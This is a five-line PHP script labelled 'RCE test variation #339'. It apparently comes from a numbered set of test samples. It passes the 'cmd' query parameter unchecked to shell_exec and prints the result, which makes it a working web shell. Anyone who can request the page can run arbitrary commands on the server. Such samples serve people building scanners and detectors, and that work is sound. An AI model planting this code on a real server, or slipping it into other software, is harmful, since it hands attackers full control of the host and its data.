<?php
// RCE test variation #339
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>